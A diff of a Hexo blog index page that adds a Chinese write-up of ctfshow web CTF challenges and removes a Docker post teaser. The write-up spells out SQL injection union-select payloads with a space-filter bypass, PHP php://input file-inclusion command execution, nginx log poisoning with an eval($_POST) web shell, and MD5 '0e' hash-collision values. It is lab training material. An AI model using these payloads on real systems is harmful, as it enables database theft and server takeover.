@@ -152,7 +152,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -186,6 +186,239 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/17/ctfshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="xuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Konglong">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Konglong">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/08/17/ctfshow/" class="post-title-link" itemprop="url">ctfshow</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-17 10:27:07 / 修改时间：11:15:49" itemprop="dateCreated datePublished" datetime="2023-08-17T10:27:07+08:00">2023-08-17</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>ctfshow</p>
+<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>查看源码，base64解码得flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上<code> &#39; or 1=1  #</code>发送</p>
+<p>成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！</p>
+<p><code>&#39;username=ctfshow&#39; order by 3  #&amp;password=123</code>显示登录成功，</p>
+<p><code>&#39;username=ctfshow&#39; order by 4  #</code>不显示，证明有三个字段。</p>
+<p><code>username=ctfshow&#39; union select 1,2,3  #&amp;password=123</code>确定回显位置，看到2显示在了页面上，利用2这个位置继续搞。</p>
+<p><code>username=ctfshow&#39; union select 1,database(),3  #&amp;password=123</code>获取到数据库名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(table_name),3  from information_schema.tables where table_schema=&#39;web2&#39;   #&amp;password=123</code> 获取数据库的表名，找到flag表啦</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;flag&#39;   #&amp;password=123</code>获取flag表中的字段名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(flag),3 from flag  #&amp;password=123</code>获取flag！</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>php伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf.show_web3</span><br><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数</p>
+<p>使用Burp Suite抓包,利用php:&#x2F;&#x2F;input伪协议执行PHP代码,代码的内容为执行系统命令,查看当前目录下所有文件</p>
+<pre><code>?url=php://input        -- GET请求的url中拼接伪协议
+&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
+</code></pre>
+<p>得到crf_go_go_go index.php，该文件就是存放flag的文件</p>
+<p>我们直接在url地址栏中拼接url参数,访问crf_go_go_go文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag</p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>日志注入</p>
+<p> ($_GET[‘url’])可看出存在文件包含漏洞</p>
+<p>F12打开网络栏，可以看到Server里面是nginx，尝试一下日志注入</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png" alt="image-20230817104534044"></p>
+<p> nginx服务器默认日志位置在</p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>在url后面输入查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p> 发现可以</p>
+<p>用Burp Suite抓包，在User-Agent后面写个🐎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 放包，注意看日志下面这时多出来一条</p>
+<p>此时木马已经插入进去了，日志中的代码会被执行但不会显示</p>
+<p>连接蚁剑</p>
+<p>注意URL地址写的是日志地址，因为我们的🐎是传进日志里了</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png" alt="image-20230817105306721"></p>
+<p>在上层可以看到flag.txt</p>
+<p> <img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png" alt="image-20230817105325864"></p>
+<p> 拿到flag</p>
+<p>ctfshow{05eeaf03-2f53-4cc6-959c-f65fb4a7163a}</p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>考点：php代码审计</p>
+<pre><code> &lt;?php
+        $flag=&quot;&quot;;
+        $v1=$_GET[&#39;v1&#39;];
+        $v2=$_GET[&#39;v2&#39;];
+        if(isset($v1) &amp;&amp; isset($v2))&#123;
+            if(!ctype_alpha($v1))&#123;
+                die(&quot;v1 error&quot;);
+            &#125;
+            if(!is_numeric($v2))&#123;
+                die(&quot;v2 error&quot;);
+            &#125;
+            if(md5($v1)==md5($v2))&#123;
+                echo $flag;
+            &#125;
+        &#125;else&#123;
+        
+            echo &quot;where is flag?&quot;;
+        &#125;
+    ?&gt;  echo &quot;where is flag?&quot;;
+    &#125;
+?&gt;
+</code></pre>
+<ul>
+<li>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</li>
+<li>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</li>
+</ul>
+<p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+
+<p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p>
+<p>240610708 的md5值为 0e462097431906509019562988736854</p>
+<p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(&#x3D;&#x3D;)时,会转化为0,也就是 0&#x3D;&#x3D;0,返回true使if判断成立,从而输出flag</p>
+<p>常用的值：</p>
+<pre><code>开头为0E（MD5值） 字母数字混合类型：
+s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904
+纯大写字母：
+QLTHNDT
+0e405967825401955372549139051580
+QNKCDZO
+0e830400451993494058024219903391
+EEIZDOI
+0e782601363539291779881938479162
+纯数字：
+240610708
+0e462097431906509019562988736854
+4011627063
+0e485805687034439905938362701775
+4775635065
+0e998212089946640967599450361168
+4790555361
+0e643442214660994430134492464512
+5432453531
+0e512318699085881630861890526097
+5579679820
+0e877622011730221803461740184915
+5585393579
+0e664357355382305805992765337023
+6376552501
+0e165886706997482187870215578015
+7124129977
+0e500007361044747804682122060876
+7197546197
+0e915188576072469101457315675502
+7656486157
+0e451569119711843337267091732412
+</code></pre>
+<p>任意使用2个即可</p>
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>web2的升级版，做了过滤</p>
+<p>一打开页面是用户名密码登录，我们首先第一个想到的就是sql注入了，来用万能钥匙1’ or 1&#x3D;1#试一下，报错了<br>然后，我在密码框里同样注入万能钥匙试了一下，发现，密码框中输入空格也会多一个黑点，于是我猜测可能是把空格过滤了，为了验证 我的猜想，来抓包看一下服务器收到的页面请求包最后传递的用户名和密码的参数值是什么样子的</p>
+<p>抓包果然发现，空格被过滤了</p>
+<p>一般空格被过滤有如下替换方法</p>
+<pre><code>/**/
+()
+回车(url编码中的%0a)
+`(tap键上面的按钮)
+tap
+两个空格
+</code></pre>
+<p>我们就选用&#x2F;**&#x2F;来替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/or/**/1=1#</span><br></pre></td></tr></table></figure>
+
+<p>好，登陆成功了</p>
+<p>接下来，来老生常谈的爆库爆表爆字段吧<br><strong>爆库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名为web2<br><strong>爆表</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
+</code></pre>
+<p>表有flag和user<br><strong>爆字段</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=1
+</code></pre>
+<p>列名也为flag<br><strong>爆字段值</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
+</code></pre>
+<p>拿到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1045,104 +1278,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/Docker2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="xuan">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Konglong">
-      <meta itemprop="description" content="Welcome">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Konglong">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/07/31/Docker2/" class="post-title-link" itemprop="url">Docker相关部署</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-07-31 21:22:22" itemprop="dateCreated datePublished" datetime="2023-07-31T21:22:22+08:00">2023-07-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-08-02 19:18:27" itemprop="dateModified" datetime="2023-08-02T19:18:27+08:00">2023-08-02</time>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>2.3k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id=""><a href="#" class="headerlink" title=""></a></h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/07/31/Docker2/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1166,13 +1301,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">96k</span>
+    <span title="站点总字数">100k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:54</span>
+    <span title="站点阅读时长">3:01</span>
   </span>
 </div>
 <div class="busuanzi-count">
